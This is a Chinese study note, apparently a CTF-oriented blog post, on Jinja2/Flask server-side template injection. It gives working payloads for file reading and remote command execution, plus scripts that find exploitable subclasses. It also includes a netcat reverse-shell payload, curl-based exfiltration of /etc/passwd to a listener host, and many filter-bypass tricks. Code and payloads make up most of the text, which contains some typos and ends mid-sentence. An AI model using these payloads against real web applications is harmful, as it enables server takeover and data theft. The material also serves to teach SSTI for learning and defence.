{"title":"ssti模板注入学习笔记-漏洞原理及漏洞应用","uid":"3137c2b6b2ca0e39e8c62639d966b498","slug":"ssti1","date":"2023-04-21T10:49:36.000Z","updated":"2023-05-19T09:54:13.469Z","comments":true,"path":"api/articles/ssti1.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/2.jpg","content":"<h2 id=\"ssti模板注入\"><a href=\"#ssti模板注入\" class=\"headerlink\" title=\"ssti模板注入\"></a>ssti模板注入</h2><p>flask漏洞-代码不严谨<br>可能造成任意文件读取和RCE远程控制控制后台系统</p>\n<h5 id=\"漏洞成因：\"><a href=\"#漏洞成因：\" class=\"headerlink\" title=\"漏洞成因：\"></a>漏洞成因：</h5><p>~~ 渲染模板时，没有严格控制对用户的输入<br>~~ 使用了危险的模板，导致用户可以和flask程序进行交互</p>\n<p>flask是基于python开发的一种web框架，那么也就意味着如果用户可以和flask进行交互的话，就可以执行python的代码，比如eval，system，file等等之类的函数。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from flask import Flask,request,render_template_string\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])\ndef index():\n    str &#x3D; request.args.get(&#39;ben&#39;)\n    html_str &#x3D; &#39;&#39;&#39;\n    &lt;html&gt;\n    &lt;head&gt;&lt;&#x2F;head&gt;\n    &lt;body&gt;&#123; &#123;str&#125; &#125;&lt;&#x2F;body&gt;        \n    &lt;&#x2F;html&gt;\n    &#39;&#39;&#39;\n    #str是被&#123; &#123;&#125; &#125;包括起来的，会被预先渲染转义，然后才会输出，不会被渲染执行；\n    return render_template_string(html_str,str&#x3D;str)\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.debug&#x3D;True\n    app.run(&#39;127.0.0.1&#39;.&#39;8888&#39;)\n    #&#123; &#123;7*7&#125; &#125;不会执行</code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from importlib.resources import contents\nimport time\nfrom flask import Flask,request,render_template_string\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])\ndef index():\n    str &#x3D; request.args.get(&#39;ben&#39;)       #&#123;&#125;里面可以定义任何参数\n    html_str &#x3D; &#39;&#39;&#39;\n    &lt;html&gt;\n    &lt;head&gt;&lt;&#x2F;head&gt;\n    &lt;body&gt;&#123;0&#125;&lt;&#x2F;body&gt;    \n    &lt;&#x2F;html&gt;\n    &#39;&#39;&#39;.format(str)     #str值通过format()函数填充到body中间\n    return render_template_string(html_str)\n    #return render_template_string会把&#123;&#125;内的字符串当成代码指令\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.debug&#x3D;True\n    app.run(&#39;127.0.0.1&#39;.&#39;8888&#39;)\n    #&#123; &#123;7*7&#125; &#125;会被当成指令执行 </code></pre>\n\n<p>可以利用魔术方法去验证模板注入</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">127.0.0.1:8888&#x2F;?a&#x3D;&#123; &#123;&quot;.__class__.__mro__&#125; &#125;</code></pre>\n\n<p>服务器端模板注入实际上也是一种注入漏洞。</p>\n<h3 id=\"判断模板类型\"><a href=\"#判断模板类型\" class=\"headerlink\" title=\"判断模板类型\"></a>判断模板类型</h3><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">$&#123;7*7&#125;成功：\na&#123;*comment*&#125;b           输出ab -&gt; Smarty\n$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;       输出azb -&gt; Mako or ???\n\n$&#123;7*7&#125;失败：\n&#123; &#123;7*7&#125; &#125; and &#123; &#123;7*&#39;7&#125;&#39;&#125;   输出49 -&gt; Jinja2 or Twig or ???</code></pre>\n\n<h3 id=\"ssti常用注入模板\"><a href=\"#ssti常用注入模板\" class=\"headerlink\" title=\"ssti常用注入模板\"></a>ssti常用注入模板</h3><p>1.文件读取<br>2.内建函数eval执行命令<br>3.os模块执行命令<br>4.importlib类执行命令<br>5.linecache函数执行命令<br>6.subprocess.Popen类执行命令</p>\n<h5 id=\"1-文件读取\"><a href=\"#1-文件读取\" class=\"headerlink\" title=\"1.文件读取\"></a>1.文件读取</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">#查找子类 _frozen_importlib_external.FileLoader\n&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;\n#FileLoader的利用\n&#123; &#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[79][&quot;get_data&quot;](0,&quot;&#x2F;etc&#x2F;passed&quot;)&#125; &#125;\n#读取配置文件下的FLAG\n&#123; &#123;config&#125; &#125;\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;</code></pre>\n\n<p>~python脚本编写<br>(POST提交”name”的值，通过for循环查找所需字符串)</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import requests\nurl &#x3D; input(&#39;请输入URL链接&#39;)\nfor i in range(500)\n    data &#x3D; &#123;&quot;name&quot;:&quot;&#123; &#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    #data &#x3D; &#123;&quot;name&quot;:&quot;&#123; &#123;().__class__.__mro__[1].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        #print(response.text)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_frozen_importlib_external.FileLoader&#39; in response.text:\n                print(i)\n    except:\n        pass </code></pre>\n\n<h5 id=\"2-内建函数eval执行命令\"><a href=\"#2-内建函数eval执行命令\" class=\"headerlink\" title=\"2.内建函数eval执行命令\"></a>2.内建函数eval执行命令</h5><p>内建函数：python在执行脚本时自动加载的模块</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import requests\nurl &#x3D; input(&#39;请输入URL链接&#39;)\nfor i in range(500):\n    data&#x3D;&#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#39;__builtins__&#39;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        #print(response.text)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;eval&#39; in response.text:\n                print(i)\n    except:\n        pass</code></pre>\n\n<p>payload:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat .&#x2F;etc&#x2F;passwd&quot;).read()&#39;)&#125; &#125;</code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">__builtins__提供对python的所有”内置“标识符的直接访问\neval()计算字符串表达式的值\n__import__加载os模块\npopen()执行一个shell以运行命令来开启一个进程，执行cat &#x2F;etc&#x2F;passwd\n(system没有回显)</code></pre>\n\n<h5 id=\"3-os模块执行命令\"><a href=\"#3-os模块执行命令\" class=\"headerlink\" title=\"3.os模块执行命令\"></a>3.os模块执行命令</h5><p>~~在其他函数中直接调用os模块</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">#通过config，调用os\n&#123; &#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()&#125; &#125;</code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">#通过url_for，调用os\n&#123; &#123;url_for.__globals__.os.popen(&#39;whoami&#39;).read()&#125; &#125;</code></pre>\n\n<p>~~在已经加载好os模块的子类里直接调用os模块</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&#39;os&#39;].popen(&quot;ls -l &#x2F;opt&quot;).read()&#125; &#125;\n&quot;&quot;&quot;\n&#39;&#39;.__class__ 返回空字符串字符串类型的类，也就是 str 类。\nstr.__bases__[0] 返回 str 基类对象。\nstr.__bases__[0].__subclasses__() 将返回所有从 str 基类继承而来的子类列表。\n[199] 表示选择该列表中的第 200 个子类，因为在 Python 中，许多内置或库（如 os、sys 等）都是基于类实现的，而拥有相同父类的类按照继承顺序排序在该列表中。\n.__init__ 返回所选子类的初始化方法。\n.__globals__[&#39;os&#39;] 返回一个包含 os 模块的全局命名空间字典。\n.popen(&quot;ls -l &#x2F;opt&quot;) 在该全局命名空间中调用 popen() 方法，并执行一个列出位于 &#x2F;opt 目录下的所有文件的命令。\n.read() 读取命令所输出的数据并返回给模板。\n&quot;&quot;&quot;</code></pre>\n\n<p>其他一些payload的举例</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;self.__dict__._TemplateReference__context.keys()&#125; &#125;\n&#123; &#123;lipsum.__globals__.os.popen(&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;</code></pre>\n\n<p><code>__base__</code>和__bases__[ ]的区别</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">__base__ 属性只能获取单一的父类，而 __bases__[] 属性可以获取到所有的直接父类。</code></pre>\n\n<h5 id=\"4-importlib类执行命令\"><a href=\"#4-importlib类执行命令\" class=\"headerlink\" title=\"4.importlib类执行命令\"></a>4.importlib类执行命令</h5><p>可以加载第三方库，使用load_module加载os<br>python脚本查找_frozen_importlib.BuiltinImporter</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_frozen_importlib.BuiltinImporter&#39; in response.text:\n                print(i)\n    except:\n        pass</code></pre>\n\n<p>payload:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;[].__class__.__base__.__subclasses__()[69][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls -l &#x2F;opt&quot;).read()&#125; &#125;</code></pre>\n\n<h5 id=\"5-linecache函数执行命令\"><a href=\"#5-linecache函数执行命令\" class=\"headerlink\" title=\"5.linecache函数执行命令\"></a>5.linecache函数执行命令</h5><p>linecache函数可用于读取任意一个文件的某一行，而这个函数中也引入了os模块，所以我们也可以利用linecache函数如执行命令。<br>python脚本查找linecache</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;linecache&#39; in response.text:\n                print(i)\n    except:\n        pass</code></pre>\n\n<p>payload:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;[].__class__.__base__.__subclasses__()[191].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&quot;ls -l &#x2F;&quot;).read()&#125; &#125;\n&#123; &#123;[].__class__.__base__.__subclasses__()[191].__init__.__globals__.linecache.os.popen(&quot;ls -l &#x2F;&quot;).read()&#125; &#125;</code></pre>\n\n<h5 id=\"6-subprocess-Popen类执行命令\"><a href=\"#6-subprocess-Popen类执行命令\" class=\"headerlink\" title=\"6.subprocess.Popen类执行命令\"></a>6.subprocess.Popen类执行命令</h5><p>从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。<br>subprocess意在替代其他几个老的模块或者函数，比如：os.system,os.popen等函数。<br>python脚本查找subprocess.Popen:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;subprocess.Popen&#39; in response.text:\n                print(i)\n    except:\n        pass</code></pre>\n\n<p>payload:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;[].__class__.__base__.__subclasses__()[200](&#39;ls &#x2F;&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125; &#125;\n&quot;&quot;&quot;\n[] 创建一个空列表。\n&#39;&#39;.__class__ 返回空字符串字符串类型的类，也就是 str 类。\nstr.__base__ 返回 str 基类对象。\nstr.__base__.__subclasses__() 将返回所有从 str 基类继承而来的子类列表。\n[200] 表示选择该列表中的第 201 个子类，因为在 Python 中，许多内置或到处的库（如 os、sys 等）都是基于类实现的，并且继承关系可能会随着版本更新而变化。\n调用所选类的初始化方法，并传递给它要执行的系统命令和参数。请注意，这里将参数传递给 shell&#x3D;True 会让命令在 shell 环境下运行，这可以使用户更容易地传递一些组合命令。\ncommunicate() 方法发起与执行命令的子进程的双向通信，并等待命令完成。我们调用此方法以获取命令输出和错误结果。\ncommunicate()[0] 返回命令输出，因为在这个例子中无需关心可能存在的错误结果。\nstrip() 去除输出的最前面之后的空白字符。\n&quot;&quot;&quot;</code></pre>\n\n<h4 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h4><p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B01.png\"></p>\n<h3 id=\"绕过过滤\"><a href=\"#绕过过滤\" class=\"headerlink\" title=\"绕过过滤\"></a>绕过过滤</h3><h5 id=\"1-绕过过滤双大括号\"><a href=\"#1-绕过过滤双大括号\" class=\"headerlink\" title=\"1.绕过过滤双大括号\"></a>1.绕过过滤双大括号</h5><p>{ % % }是属于flask的控制语句，且以{ % end… % }结尾，可以通过在控制语句定义变量或者写循环，判断。<br><code>示例app.py:</code></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from flask import Flask,rendre_template\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;)\ndef show1():\n    girls &#x3D; [&#39;小红&#39;,&#39;小蓝&#39;，&#39;小粉&#39;,&#39;小黄&#39;,&#39;小绿&#39;]\n    return render_template(&#39;index.html&#39;,girls&#x3D;girls)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()</code></pre>\n\n<p>示例index.html:</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Document&lt;&#x2F;title&gt;\n    &lt;style&gt;\n            .a&#123;\n                color:red;\n                font_weight:bold;\n            &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;ul&gt;\n    &#123; % for girl in girls % &#125;\n        &#123; % if girl|length &gt;&#x3D;3 % &#125;\n            &lt;li class&#x3D;&quot;a&quot;&gt;&#123; &#123;girl&#125; &#125;&lt;&#x2F;li&gt;\n        &#123; % else % &#125;\n            &lt;li&gt;&#123; &#123;girl&#125; &#125;&lt;&#x2F;li&gt;\n        &#123; % endif % &#125;\n    &#123; % endfor % &#125;\n&lt;&#x2F;ul&gt;\n&#123; % set name&#x3D;&#39;a&#39; % &#125;\n&#123; &#123;name&#125; &#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;</code></pre>\n\n<p>解题思路</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">#判断&#123; &#123;&#125; &#125;被过滤\n#尝试&#123; % % &#125;\n&#123; % if 2&gt;1 % &#125;name&#123; % endif % &#125;\n&#123; % if &#39;&#39;.__class__ % &#125;name&#123; % endif % &#125;\n#有回显name说明&#39;&#39;.__class__有内容\n&#123; % if &quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read() % &#125;name&#123; % endif % &#125;\n#如果有回显name则说明命令正常执行</code></pre>\n<p>构造脚本查询可使用“popen”的子类编号</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import requests\nurl &#x3D; input(&quot; 请输入url链接 &quot;)\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; % if &quot;&quot;.__class__.__base__.__subclasses()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read() % &#125;name&#123; % endif % &#125;&#39;&#125;\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &quot;name&quot; in response.text:\n                print(i,&quot;--&gt;&quot;,data)  \n                break\n    except:\n        pass</code></pre>\n\n<p>payload：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; % print(&quot;&quot;.__class__.__base__.__subclasses()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read()) % &#125;</code></pre>\n\n<h5 id=\"2-无回显ssti模板注入\"><a href=\"#2-无回显ssti模板注入\" class=\"headerlink\" title=\"2.无回显ssti模板注入\"></a>2.无回显ssti模板注入</h5><p>~ ssti盲注思路：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">(1)反弹shell\n通过rce反弹一个shell出来绕过\n(2)带外注入\n通过requestbin或dnslog的方法将信息传到外界\n(3)纯盲注</code></pre>\n\n<p>反弹shell（没有回显，直接使用脚本批量执行希望执行的命令）</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import requests\n\nurl &#x3D; input(&quot;请输入目标URL地址&quot;)\n\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 监听主机 端口 -e &#x2F;bin&#x2F;bash&quot;).read()&#125; &#125;&#39;&#125;\n        response &#x3D; requests.post(url,data&#x3D;data)\n    except:\n        pass\n#监听主机收到反弹shell进入对方命令行界面</code></pre>\n\n<p>带外注入<br>此处使用wget方法来带外想要知道的内容，<br>也可以使用dnslog或者nc。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import requests\n\nurl &#x3D; input(&quot;请输入目标URL地址&quot;)\n\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;curl http:&#x2F;&#x2F;监听主机ip&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot;).read()&#125; &#125;&#39;&#125;            \n        #反引号命令执行\n        response &#x3D; requests.post(url,data&#x3D;data)\n    except:\n        pass\n#同时kali开启一个python http监听  #python3 -m http.server 80\n#cat没办法换行，只能显示第一行（需要配合换行命令来显示其他内容）</code></pre>\n\n<p>纯盲注</p>\n<h5 id=\"3-getitem绕过中括号过滤\"><a href=\"#3-getitem绕过中括号过滤\" class=\"headerlink\" title=\"3.getitem绕过中括号过滤\"></a>3.getitem绕过中括号过滤</h5><p><code>__getitem__()</code>是python的一个魔术方法，<br>对字典使用时，传入字符串，返回字典相应键所对应的值；<br>对列表使用时，传入整数，返回列表对应索引的值；</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">class test():\n    def __init__(self):\n        self.a&#x3D;&#123;\n            &#39;1&#39;:&#39;小红&#39;,\n            &#39;2&#39;:&#39;小绿&#39;,\n            &#39;3&#39;:&#39;小黄&#39;\n            &#125;\n    def getitem(self,key):\n        b &#x3D; self.a[key]\n        return b\nt &#x3D; test()\nprint(t.getitem(&#39;2&#39;))</code></pre>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">class test():\n    def __init__(self):\n        self.a&#x3D;&#123;\n            &#39;1&#39;:&#39;小红&#39;,\n            &#39;2&#39;:&#39;小绿&#39;,\n            &#39;3&#39;:&#39;小黄&#39;\n            &#125;\n    def __getitem__(self,key):\n        b &#x3D; self.a[key]\n        return b\nt &#x3D; test()\nprint(t[&#39;2&#39;])           #实体对象[&#39;key&#39;] 系统会自动调用__getitem__方法</code></pre>\n\n<p>可以用来绕过[]过滤</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;&#39;&#39;.__ckass__.__base__.__subclasses__().__getitem__(&#39;+ str(i) +&#39;)&#125; &#125;</code></pre>\n\n<p>使用__getitem__()构造payload:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;code&quot;:\n    &#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#39;+str(i)+&#39;)&#125; &#125;&#39;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_wrap_close&#39; in response.text:\n                print(i,&quot;---&gt;&quot;,response.text)\n                break\n    except:\n        pass</code></pre>\n<p>payload:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passed&#39;).read()&#125; &#125;</code></pre>\n\n<h5 id=\"4-request绕过单双引号过滤\"><a href=\"#4-request绕过单双引号过滤\" class=\"headerlink\" title=\"4.request绕过单双引号过滤\"></a>4.request绕过单双引号过滤</h5><p>request在flask中可以访问基于HTTP请求传递的所有信息<br>此request并非python函数，而是在flask内部的函数</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">request.args.key    获取get传入的key的值\nrequest.values.x1   所有参数 \nrequest.cookies     获取cookies传入参数 \nrequest.headers     获取请求头请求参数 \nrequest.form.key    获取post传入参数\n（Content-Type：applicaation／x-www-form-urlencoded或multipart／form-data） request.data        获取post传入参数（Content-Type：a／b） \nrequest.json        获取post传入json参数（Content-Type：application／json） </code></pre>\n\n<p>app.py</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from flask import Flask, render template, request\n\napp&#x3D;Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;]) \ndef show1():\n    return render_template(&#39;index.html&#39;) \n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run(host&#x3D;&#39;0.0.0.0&#39;) </code></pre>\n\n<p>index.html</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">&lt;html lang&#x3D;&quot;en&quot;&gt; \n&lt;head&gt;\n&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; \n&lt;title&gt;过滤器的使用&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;br&gt;\n获取get提交数据： &#123; &#123;request.args.k1&#125; &#125;\n&lt;br&gt;\n获取post提交数据：&#123; &#123;request.form.k2&#125; &#125;\n&lt;br&gt;\n获取cookie提交数据：&#123; &#123;request.cookies.k3&#125; &#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;</code></pre>\n<p>在构造payload时大多会用到单双引号，<br>可以通过构造带 参数的url，<br>配合request获取参数的内容来组成想要提交的指令，<br>从而绕过单双引号的使用。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">#POST提交payload\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.k1](requests.form.k2).read()&#125; &#125;&amp;k1&#x3D;popen&amp;k2&#x3D;cat &#x2F;etc&#x2F;passwd\n#cookie提交payload\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.cookies.k1](request.cookies.k2).read()&#125; &#125;\n#Cookie:k1&#x3D;popen;k2&#x3D;cat &#x2F;etc&#x2F;passwd</code></pre>\n\n<h5 id=\"5-过滤器绕过下划线过滤\"><a href=\"#5-过滤器绕过下划线过滤\" class=\"headerlink\" title=\"5.过滤器绕过下划线过滤\"></a>5.过滤器绕过下划线过滤</h5><p>过滤器<br>1.过滤器通过管道符号（|）与变量连接，并且在括号中可能有可选的参数。<br>2.可以链接到多个过滤器，一个过滤器的输出将应用与下一个过滤器。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B02.png\"><br><code>app.py</code><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B0app.py_1.png\"><br>index.html<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94index.html_1.png\"></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;()|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)&#125; &#125;\n#attr绕过下划线_过滤\n&#39;&#39;&#39;\n1.使用reques方法\nGET请求：URL&#x2F;?cla&#x3D;__class__\nPOST提交：code&#x3D;&#123; &#123;()|attr(request.args.cla)&#125; &#125;\n&#39;&#39;&#39;\n#&#123; &#123;&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passed&#39;).read()&#125; &#125;\n#例子：\n#GET提交：URL&#x2F;?cla&#x3D;__class__&amp;bas&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;ini&#x3D;__init__&amp;glo&#x3D;__globals__&amp;gei&#x3D;__getitem__\n#POST提交：&#123; &#123;&#39;&#39;|attr(request.args.cla)|attr(request.args.sub)()|attr(request.args.gei)(117)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.gei)(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passwd&#39;)|attr(&#39;read&#39;)()&#125; &#125;\n&#39;&#39;&#39;\n2.使用unicode编码\n3.使用16位编码\n4.base64编码\n5.格式化字符串      %c %95即下划线\n&#39;&#39;&#39;</code></pre>\n\n<h5 id=\"6-中括号绕过点过滤\"><a href=\"#6-中括号绕过点过滤\" class=\"headerlink\" title=\"6.中括号绕过点过滤\"></a>6.中括号绕过点过滤</h5><p>点’.’被过滤<br>1.用中括号代替点<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B03.png\"><br>2.attr()绕过<br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B04.png\"></p>\n<h5 id=\"7-绕过关键字过滤\"><a href=\"#7-绕过关键字过滤\" class=\"headerlink\" title=\"7.绕过关键字过滤\"></a>7.绕过关键字过滤</h5><p>过滤了”class””arg””from””value””int””global”等关键字</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">以&quot;__class__&quot;为例\n1.字符编码\n2.最简单的拼接“+”：&#39;__cl&#39;+&#39;ass__&#39;\n3.使用Jinjia2中的&quot;~&quot;进行拼接：&#123; %set a&#x3D;&quot;__cla&quot;% &#125;&#123; %set b &#x3D; &quot;ss__&quot;% &#125;&#123; &#123;()[a~b]&#125; &#125;\n4.利用过滤器（reverse反转，replace替换，join拼接等）：\n&#123; %set a&#x3D;&quot;__ssalc__&quot;|reverse% &#125;&#123; &#123;()[a]&#125; &#125;\n5.利用python的char():\n&#123; %set chr&#x3D;url_for.__globals__[&#39;__builtins__&#39;].chr% &#125;&#123; &#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(95)%2bchr(95)]&#125; &#125;\n#为了避免字符串被过滤&#x2F;转义，基于chr()函数来生成整数编码的字符，并将其拼接成字符串。例如，在上面的代码中，chr(95)会生成一个下划线字符 &quot;_&quot; 的ASCII编码，chr(99)则对应着 &quot;c&quot; 